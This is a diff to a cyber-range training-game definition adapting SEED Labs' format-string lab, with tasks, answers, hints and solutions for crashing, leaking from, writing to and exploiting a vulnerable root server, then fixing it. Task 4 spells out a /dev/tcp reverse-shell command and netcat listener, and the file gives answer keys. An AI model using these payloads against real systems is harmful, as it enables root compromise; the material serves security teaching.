@@ -1,11 +1,11 @@
 {
-  "title": "Format String Foothold",
-  "description": "A single-VM, 32-bit format-string privilege-escalation exercise, following all eight tasks of SEED Labs' Format String Vulnerability Lab against the lab's own server.c.",
+  "title": "Format String Attack Lab",
+  "description": "A two-machine format-string exploitation exercise, following all six tasks of SEED Labs' Format String Attack Lab against the lab's own format.c/server.c, attacker vs. victim.",
   "prerequisites": [
     "Comfortable with the Linux command line and basic C (pointers, the stack)."
   ],
   "outcomes": [
-    "Identify, leak through, write through, and exploit a format-string vulnerability to escalate from an unprivileged user to root on the same VM."
+    "Identify, leak through, write through, and exploit a format-string vulnerability on both a 32-bit and a 64-bit target, understand the 64-bit zero-byte-address constraint, and fix the underlying bug."
   ],
   "state": "UNRELEASED",
   "show_stepper_bar": true,
@@ -16,91 +16,51 @@
       "order": 0,
       "estimated_duration": 0,
       "minimal_possible_solve_time": null,
-      "content": "# General information\n\n* This game is for educational purposes only.\n* The solution of a level is required for later levels.\n\n# Storyline\n\nA single VM runs a format-string-vulnerable UDP daemon as root (`printf(msg)` instead of `printf(\"%s\", msg)`). You log into that same VM as an unprivileged user and attack the daemon over `127.0.0.1:9090/udp` to escalate to root.\n\nThis follows all eight tasks of SEED Labs' *Format String Vulnerability Lab* (W. Du) — see ATTRIBUTION.txt.\n\n# Before you start\n\nThe daemon never exits (it loops on `recvfrom()` forever) and prints everything to its own stdout, which systemd captures. Watch it live with:\n\n```\nsudo journalctl -u server -f\n```\n\nSend it packets with `nc -u 127.0.0.1 9090` (or a short Python/`socat` script) from a second terminal on the same VM."
+      "content": "# General information\n\n* This game is for educational purposes only.\n* The solution of a level is required for later levels.\n\n# Storyline\n\n`format.c` has a classic format-string bug: it hands your input straight to `printf()` as the *format string itself* (`printf(msg)`), instead of as a `%s` argument (`printf(\"%s\", msg)`). A copy of it runs on `victim`, fed over the network by `server.c`, which accepts a TCP connection, hooks it up as the program's stdin, and runs it with root privilege.\n\nAcross six tasks you will: crash it, read its memory, write to its memory, and finally inject code to get a root shell on `victim` - once as a 32-bit binary, once as a 64-bit one.\n\nThis exercise adapts SEED Labs' *Format String Attack Lab* (W. Du, CC BY-NC-SA 4.0) - see ATTRIBUTION.txt. You get the same files the handout's students get (`Makefile`, `server.c`, `format.c`, `attack-code/`); nothing about how the vulnerable program or the server wrapper behaves has been changed."
     },
     {
-      "title": "Get Access",
+      "title": "Access the Attacker Machine",
       "level_type": "ACCESS_LEVEL",
       "order": 1,
       "estimated_duration": 0,
       "minimal_possible_solve_time": null,
       "passkey": "start",
-      "cloud_content": "Access the sandbox, then submit **`start`**.\n\n### Sandbox access\n1. In the topology overview, right-click **`victim`** and click **`Open GUI`**.\n2. Login with username **`seed`** and password **`dees`**.\n\nSee [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for SSH access.",
+      "cloud_content": "Access the sandbox, then submit **`start`**.\n\n### Sandbox access\n1. In the topology overview, right-click **`attacker`** and click **`Open GUI`**.\n2. Login with username **`seed`** and password **`dees`**.\n\n`~/attack-code/build_string.py` and `~/attack-code/exploit.py` are already there - the handout's own scaffolding, nothing solved for you.\n\nSee [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for SSH access.",
       "local_content": "This sandbox has not been tested for use with local sandbox."
     },
     {
-      "title": "Recon",
-      "level_type": "TRAINING_LEVEL",
+      "title": "Access the Victim Machine and Build the Servers",
+      "level_type": "ACCESS_LEVEL",
       "order": 2,
-      "estimated_duration": 5,
+      "estimated_duration": 10,
       "minimal_possible_solve_time": null,
-      "answer": "9090",
-      "answer_variable_name": null,
-      "content": "Confirm the UDP daemon is running on this VM and find its port.\n\nThe flag is the port number.",
-      "solution": "`sudo ss -lunp | grep server`  (or `nmap -sU -p- 127.0.0.1`)",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "It's UDP, not TCP",
-          "content": "nmap needs -sU for a UDP scan; ss/netstat show UDP sockets separately from TCP ones.",
-          "hint_penalty": 2,
-          "order": 0
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 5,
-      "variant_answers": false,
-      "reference_solution": [],
-      "mitre_techniques": [],
-      "expected_commands": [],
-      "commands_required": false
+      "passkey": "running",
+      "cloud_content": "Access `victim`, build the lab yourself exactly as the handout's Section 2.3 has you do with `make` / `make install`, start both servers, then submit **`running`**.\n\n### Sandbox access\n1. In the topology overview, right-click **`victim`** and click **`Open GUI`**.\n2. Login with username **`seed`** and password **`dees`**.\n\n### Build and start the servers\n```\ncd ~/server-code\nmake\nsudo nohup ./server32 > ~/server32.log 2>&1 &\nsudo nohup ./server64 > ~/server64.log 2>&1 &\ndisown -a\n```\n`server32` execs `format-32` and listens on **TCP/9090**; `server64` execs `format-64` and listens on **TCP/9092**. Both run as root, same as the handout's server (Section 2.2). `sudo` here is scoped to only these two binaries - there is no general root shell handed to you.\n\nEach server prints its own banner (input buffer address, secret's address, target's address, frame pointer, ...) to the log file you redirected it to - `tail -f ~/server32.log` (or `~/server64.log`) in a second terminal on `victim` to watch it, the same way the handout's students watch their container's console (Section 2.3).",
+      "local_content": "This sandbox has not been tested for use with local sandbox."
     },
     {
-      "title": "Task 2: Understanding the Stack Layout",
+      "title": "Task 1: Crashing the Program",
       "level_type": "TRAINING_LEVEL",
       "order": 3,
-      "estimated_duration": 10,
+      "estimated_duration": 15,
       "minimal_possible_solve_time": null,
-      "answer": "lower",
+      "answer": "(^_^)(^_^)  Returned properly (^_^)(^_^)",
       "answer_variable_name": null,
-      "content": "Before attacking anything, look at Figure 1 of the handout: it shows where the format string, `myprintf()`'s return address, and your own input buffer sit relative to each other when `printf()` is invoked from inside `myprintf()`.\n\nThe flag is: on x86, does the call stack grow toward **higher** or **lower** memory addresses as more functions are called? (answer with one word)",
-      "solution": "Lower. Each new stack frame is placed at a lower address than the one that called it - which is why, in Figure 1, `buf[1500]` (allocated in `main()`, called first) sits at a *higher* address than `myprintf()`'s frame, which sits higher than `printf()`'s.",
+      "content": "From `attacker`, send a benign message to `server32` first, and watch `server32.log` on `victim`:\n\n```\necho hello | nc 10.1.26.20 9090\n```\nYou should see the program report its received size and finish normally.\n\nNow send input made up of several `%s` specifiers instead of plain text, and compare the log.\n\nThe flag is the exact line that appears in the log after a benign request but never after a crashing one.",
+      "solution": "```\n$ printf 'hello' | nc 10.1.26.20 9090\n$ printf '%s%s%s%s%s%s%s%s%s%s%s%s' | nc 10.1.26.20 9090\n```\nEach `%s` makes `printf` dereference the next stack value as a pointer; most of them are not valid addresses, so `format-32` segfaults inside `myprintf()` before `main()` can print its closing line.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "Look at Figure 1",
-          "content": "main() is at the top (higher address) and printf() is at the bottom (lower address) of the diagram.",
+          "title": "Which program crashes?",
+          "content": "format-32 crashes; server32 (the listener) does not - it just spawns a new format-32 for the next connection.",
           "hint_penalty": 2,
           "order": 0
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 5,
-      "variant_answers": false,
-      "reference_solution": [],
-      "mitre_techniques": [],
-      "expected_commands": [],
-      "commands_required": false
-    },
-    {
-      "title": "Task 3: Crash the Program",
-      "level_type": "TRAINING_LEVEL",
-      "order": 4,
-      "estimated_duration": 10,
-      "minimal_possible_solve_time": null,
-      "answer": "SERVER-READY",
-      "answer_variable_name": null,
-      "content": "Send the daemon several `%s` format specifiers (e.g. via `nc -u 127.0.0.1 9090`). Each one tells `printf()` to dereference the next stack value as a pointer; most aren't valid, and the process segfaults.\n\nBecause this program never forks and never exits on its own (section 2.1), a crash takes down the *entire* daemon, not just one request - systemd (`Restart=always`) brings it back after about a second. Watch `sudo journalctl -u server -f` while you send the crash: you'll see the one-time startup line twice - once from before your crash, once from the restart.\n\nThe flag is that line.",
-      "solution": "```\n$ printf '%s%s%s%s%s%s%s%s%s%s%s%s' | nc -u -w1 127.0.0.1 9090\n```\nWatch the journal: `SERVER-READY` appears once at initial boot, then again a moment after your crash payload, once systemd restarts the service.",
-      "solution_penalized": true,
-      "hints": [
+        },
         {
-          "title": "Why does the whole daemon die?",
-          "content": "There's no fork() here - one process handles every packet in an infinite loop, so a segfault takes the entire service down.",
+          "title": "Why does it crash?",
+          "content": "Each %s tells printf to dereference the next stack value as a pointer; most aren't valid.",
           "hint_penalty": 3,
-          "order": 0
+          "order": 1
         }
       ],
       "incorrect_answer_limit": 10,
@@ -113,34 +73,28 @@
       "commands_required": false
     },
     {
-      "title": "Task 4: Print Out the Server's Memory",
+      "title": "Task 2: Printing Out the Server Program's Memory",
       "level_type": "TRAINING_LEVEL",
-      "order": 5,
-      "estimated_duration": 20,
+      "order": 4,
+      "estimated_duration": 25,
       "minimal_possible_solve_time": null,
       "answer": null,
       "answer_variable_name": "flag_task4",
-      "content": "**4.A — Stack data.** Send a unique 4-byte marker and enough `%.8x` specifiers to get it echoed back in the output - that tells you how many stack slots sit between the start of the format string and the start of your own input.\n\n**4.B — Heap data.** Using that same offset, place the secret message's address (printed by the daemon at every request... no - see hint) little-endian at the start of your payload, followed by a `%s` at the right position, to leak its contents. Building the binary address bytes by hand in a terminal is awkward - use `build_string.py` in `/home/user/attack-code/` (SEED's own helper script, already on this VM) as a starting point.\n\nSee the handout's section 2.4.\n\nThe flag is the secret string revealed in 4.B.",
-      "solution": "See the handout, section 2.4, and build_string.py in /home/user/attack-code/.",
+      "content": "Still against `server32` (10.1.26.20:9090).\n\n**Task 2.A - Stack data.** How many `%x` specifiers does it take before the output matches the first four bytes of your own input? Send a unique 4-byte marker followed by several `%x`, and compare against `server32.log`. This offset is the key you need for every later task - get it right.\n\n**Task 2.B - Heap data.** `server32.log` also gives you the secret message's address directly. Using your Task 2.A offset with `%N$s` (positional parameter) and that address placed little-endian at the very start of your input, leak the secret.\n\nThe flag is the secret string revealed in 2.B.",
+      "solution": "2.A: send e.g. `AAAA%x%x%x%x%x%x%x%x` and see at which `%x` `41414141` appears. 2.B: pack the secret's address (from the log) as 4 little-endian bytes, then `%<offset>$s` to have printf treat that address as a string pointer and print what it points to.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "Finding your offset (4.A)",
-          "content": "Send a recognizable 4-byte marker followed by several %.8x and count how many it takes to see it echoed back.",
+          "title": "Finding your offset (2.A)",
+          "content": "Send a unique marker followed by several %x and look for which one echoes it back.",
           "hint_penalty": 5,
           "order": 0
         },
         {
-          "title": "Where's the secret's address? (4.B)",
-          "content": "It isn't printed by this program on every request the way earlier labs do - you'll need to find it a different way (e.g. a debugger against your own locally-built copy with the same DUMMY_SIZE, or by leaking enough stack data in 4.A to spot it).",
-          "hint_penalty": 6,
+          "title": "Byte order (2.B)",
+          "content": "x86 is little-endian: 0xAABBCCDD is stored as DD CC BB AA.",
+          "hint_penalty": 5,
           "order": 1
-        },
-        {
-          "title": "Byte order",
-          "content": "x86 is little-endian when packing an address into your payload.",
-          "hint_penalty": 4,
-          "order": 2
         }
       ],
       "incorrect_answer_limit": 10,
@@ -153,34 +107,28 @@
       "commands_required": false
     },
     {
-      "title": "Task 5: Modify the Server's Memory",
+      "title": "Task 3: Modifying the Server Program's Memory",
       "level_type": "TRAINING_LEVEL",
-      "order": 6,
+      "order": 5,
       "estimated_duration": 25,
       "minimal_possible_solve_time": null,
-      "answer": "0x00000500",
+      "answer": "The target variable's value (after):  0x00005000",
       "answer_variable_name": null,
-      "content": "Use `%n` with the offset from Task 4 to write to a chosen address instead of reading from it - target the `target` variable.\n\n**5.A** — change `target` to any different value, to confirm the write works at all.\n**5.B** — change it to exactly `0x500`.\n**5.C** — for a target like `0xFF990000`, don't make `printf()` emit that many characters: use `%hn` (2 bytes at a time) and split `target` into its two 16-bit halves, writing each separately. Getting a half down to `0x0000` specifically needs the overflow trick explained in section 2.5 - explain in your own notes why a small target value is the hard case.\n\nThe flag is `target`'s value exactly as the program prints it in 5.B (`0x` followed by 8 hex digits, zero-padded) once it reads back as `0x500`.",
-      "solution": "See the handout, section 2.5.",
+      "content": "Still against `server32`. Use `%n` with your Task 2.A offset to *write* to an address instead of reading it - target the `target` variable, whose address is also in `server32.log`.\n\n**3.A** - change `target` to any different value, to confirm the write works at all.\n**3.B** - change it to exactly `0x5000`.\n**3.C** - change it to `0xAABBCCDD`. Printing that many characters with a plain `%n` would take far too long - use `%hn` (or `%hhn`) to write 2 (or 1) bytes at a time instead of 4.\n\nThe flag is the line `server32.log` prints once `target` reads back as exactly `0x5000` (3.B).",
+      "solution": "A width field like `%05000d` lets you set printf's running output-byte-count to 0x5000 before the `%n` fires at your target's address. For 3.C, split the 4-byte target into two 2-byte halves and write each with its own `%hn` at its own half-address.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "Controlling the byte count (5.B)",
-          "content": "A width-padded conversion like %.500d lets you set printf's running output-byte-count before the %n.",
+          "title": "Controlling the byte count (3.B)",
+          "content": "A width-padded conversion like %050d lets you set printf's running output-byte-count before the %n.",
           "hint_penalty": 5,
           "order": 0
         },
         {
-          "title": "Reaching 0xFF990000 (5.C)",
-          "content": "Write the low 16 bits and high 16 bits of target separately with two %hn's, each at its own address.",
+          "title": "Large values (3.C)",
+          "content": "%hn / %hhn write 2 / 1 bytes at a time, reaching a large target without huge padding.",
           "hint_penalty": 5,
           "order": 1
-        },
-        {
-          "title": "Why is a small value hard?",
-          "content": "You can only ever increase the running output-byte-count, never decrease it - reaching a small target means overflowing all the way around past 2^16.",
-          "hint_penalty": 5,
-          "order": 2
         }
       ],
       "incorrect_answer_limit": 10,
@@ -193,39 +141,33 @@
       "commands_required": false
     },
     {
-      "title": "Task 6-7: Inject Code and Get a Root Shell",
+      "title": "Task 4: Inject Malicious Code into the Server Program",
       "level_type": "TRAINING_LEVEL",
-      "order": 7,
-      "estimated_duration": 35,
+      "order": 6,
+      "estimated_duration": 40,
       "minimal_possible_solve_time": null,
       "answer": null,
-      "answer_variable_name": "flag_task7",
-      "content": "Combine the read and write primitives from Tasks 4-5 to overwrite `myprintf()`'s saved return address with the address of shellcode placed inside your own input (the stack is executable - `-z execstack`). See the handout's sections 2.6 (shellcode structure, `execve()`) and 2.7 (upgrading a one-shot command into a reverse shell).\n\n`exploit.py` in `/home/user/attack-code/` already has the 32-bit shellcode skeleton from the handout - it's set up to run `/bin/ls -l` as a demo. You'll need to: (1) change the command string to something that gets you the flag, e.g. copying `/root/flag_task3.txt` somewhere you can read as `user`; and (2) work out the actual offsets and addresses for *this* target - the skeleton was written for a different lab (different stack layout, different protocol), so don't expect it to work unmodified.\n\nA full reverse shell (section 2.7: `nc -lvp <port>` on your own session, then a shellcode that connects back to it) is the more convenient route once you've got one-shot command injection working - you can just `cat` the file directly from an interactive root shell instead of crafting a second exploit for the copy step.\n\nThe flag is the contents of `/root/flag_task3.txt`.",
-      "solution": "This exercise doesn't ship a working payload for this target - build and test one yourself, adapting exploit.py's shellcode and the offsets you found in Tasks 4-5. See INSTRUCTOR_NOTES.md.",
+      "answer_variable_name": "flag_reverse_shell",
+      "content": "Combine Tasks 2-3: place the shellcode from `~/attack-code/exploit.py` (32-bit version) somewhere in your own 1500-byte input, work out the address it lands at, and use the `%n` write primitive to overwrite `myprintf()`'s saved return address with that address, so when it returns, it jumps into your shellcode instead.\n\nFirst demonstrate this with the shellcode's stock command (`/bin/ls -l; echo ...`) - watch `server32.log` for its output.\n\nThen get a **reverse shell**: edit the command string to\n```\n/bin/bash -i > /dev/tcp/10.1.26.10/7070 0<&1 2>&1\n```\n(10.1.26.10 is `attacker`), keeping the string's total length unchanged (pad with spaces). On `attacker`, listen first:\n```\nnc -nv -l 7070\n```\nthen send your payload to `server32` (10.1.26.20:9090). You should get a root shell back on `attacker`'s terminal.\n\nThe flag is the content of `/root/flag_reverse_shell.txt` on `victim`, read from that reverse shell.",
+      "solution": "Put the shellcode at offset 0 of your payload; its address is the input buffer's address from `server32.log`. Overwrite the return address of myprintf() (handout Figure 1, location 2) with that address, using the same %n primitive as Task 3 at the offset that lands on that stack slot.",
       "solution_penalized": true,
       "hints": [
         {
           "title": "Where does the shellcode go?",
-          "content": "Anywhere in your own input, at a known offset you can compute an address for.",
-          "hint_penalty": 7,
+          "content": "Anywhere in your own input, at a known offset you can compute an address for - offset 0 is simplest.",
+          "hint_penalty": 6,
           "order": 0
         },
         {
           "title": "What do you overwrite?",
-          "content": "The saved return address of the function printf() is running inside - the same one your %n write targets, just a different address.",
+          "content": "The saved return address of the function printf() is running inside - handout Figure 1, location 2.",
           "hint_penalty": 7,
           "order": 1
-        },
-        {
-          "title": "Reading a root-only file as a non-root user",
-          "content": "Your shellcode runs as root (the daemon's own privilege) - have it copy the file to somewhere world-readable, e.g. /tmp, as part of the command string.",
-          "hint_penalty": 5,
-          "order": 2
         }
       ],
       "incorrect_answer_limit": 10,
       "attachments": [],
-      "max_score": 40,
+      "max_score": 35,
       "variant_answers": true,
       "reference_solution": [],
       "mitre_techniques": [],
@@ -233,20 +175,48 @@
       "commands_required": false
     },
     {
-      "title": "Task 8: Fixing the Problem",
+      "title": "Task 5: Attacking the 64-bit Server Program",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 20,
+      "minimal_possible_solve_time": null,
+      "answer": "Two",
+      "answer_variable_name": null,
+      "content": "Repeat Task 4 against `server64` (10.1.26.20:9092, execs `format-64`), using the 64-bit shellcode in `exploit.py` and a fresh reverse shell listener on `attacker`.\n\nx86-64 user-space addresses never exceed `0x00007FFFFFFFFFFF`, so every 8-byte address you place in your payload has zero bytes in it - and `printf()` stops reading its format string at the first `\\0`. You therefore can't paste a raw address into the middle of your payload followed by more format-string text; every address has to sit at the very start of the buffer instead, reached with `%N$` positional parameters (the same syntax you already used in Tasks 2-4).\n\nThe flag: how many of the 8 bytes in a typical x86-64 user-space address are always `0x00`?",
+      "solution": "Two. Valid x86-64 user-space addresses top out at 0x00007FFFFFFFFFFF, so the top two bytes of every address are always zero - which is why every address in this exercise's payloads has to sit at the start of the buffer (via %N$), never in the middle followed by more text.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where do the zero bytes come from?",
+          "content": "x86-64 Linux user-space addresses top out around 0x00007FFFFFFFFFFF.",
+          "hint_penalty": 3,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 15,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Task 6: Fixing the Problem",
       "level_type": "TRAINING_LEVEL",
       "order": 8,
       "estimated_duration": 10,
       "minimal_possible_solve_time": null,
       "answer": "-Wformat-security",
       "answer_variable_name": null,
-      "content": "`gcc` warns about the vulnerable `printf(msg)` call at compile time by default. Build `server.c` and read the warning.\n\nFix the vulnerability (pass the user's input as a `%s` argument instead of as the format string itself), recompile, and confirm your Task 3 payload no longer crashes the daemon.\n\nThe flag is the name of the compiler warning flag gcc reports for this specific mistake (format: `-W...`).",
-      "solution": "`-Wformat-security`. The fix is to change `printf(msg)` to `printf(\"%s\", msg)` - after that, every `%` character in the input is just a literal character again, and the warning disappears on rebuild.",
+      "content": "`gcc` warns about the vulnerable `printf(msg)` call at compile time by default - you saw it the first time you ran `make`. Find the warning.\n\nFix the vulnerability in your own copy of `format.c` (pass the input as a `%s` argument instead of as the format string itself: `printf(\"%s\", msg)`), rebuild, and confirm your Task 1 payload no longer crashes it.\n\nThe flag is the name of the compiler warning flag gcc reports for this mistake (format: `-W...`).",
+      "solution": "`-Wformat-security`. Changing `printf(msg)` to `printf(\"%s\", msg)` makes every `%` in the input a literal character again, and the warning disappears on rebuild.",
       "solution_penalized": true,
       "hints": [
         {
           "title": "Where's the warning?",
-          "content": "It appears during compilation, pointing at the printf(msg) line.",
+          "content": "It appears during `make`, pointing at the printf(msg) line in format.c.",
           "hint_penalty": 2,
           "order": 0
         }
@@ -261,6 +231,6 @@
       "commands_required": false
     }
   ],
-  "estimated_duration": 115,
+  "estimated_duration": 145,
   "variant_sandboxes": false
 }
